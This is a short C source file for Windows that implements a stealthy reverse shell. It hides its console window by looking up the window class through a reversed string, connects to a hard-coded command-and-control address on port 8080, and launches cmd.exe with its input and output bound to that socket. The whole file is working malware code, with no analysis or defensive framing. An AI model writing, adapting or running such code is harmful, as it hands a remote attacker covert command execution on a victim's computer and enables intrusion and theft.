
#include <winsock2.h>
#include<tchar.h>
#include <stdio.h>
#include <winuser.h>
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#pragma comment(lib,"ws2_32")
#pragma comment (lib, "User32.lib")
void hide();

int main(void)
{
	hide();
	WSADATA wsaData;
	SOCKET socket;
	struct sockaddr_in c2_server;
	char ip_addr[16];
	STARTUPINFO st;
	PROCESS_INFORMATION pi;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL,
	    (unsigned int)NULL, (unsigned int)NULL);

	c2_server.sin_family = AF_INET;
	c2_server.sin_port = htons(8080);
	c2_server.sin_addr.s_addr = inet_addr("192.168.8.112");

	WSAConnect(socket, (SOCKADDR*)&c2_server, sizeof(c2_server), NULL, NULL, NULL, NULL);

	memset(&st, 0, sizeof(st));
	st.cb = sizeof(st);
	st.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	st.hStdInput = st.hStdOutput = st.hStdError = (HANDLE) socket;

	TCHAR commandLine[256] = "cmd.exe";
	CreateProcess(NULL, commandLine, NULL, NULL, TRUE,
	    0, NULL, NULL, &st, &pi);
}
void hide()
{
	HWND stealth; /*creating stealth (window is not visible)*/
    AllocConsole();
    stealth=FindWindowA(strrev("ssalCwodniWelosnoC"),NULL);
    ShowWindow(stealth,0);
}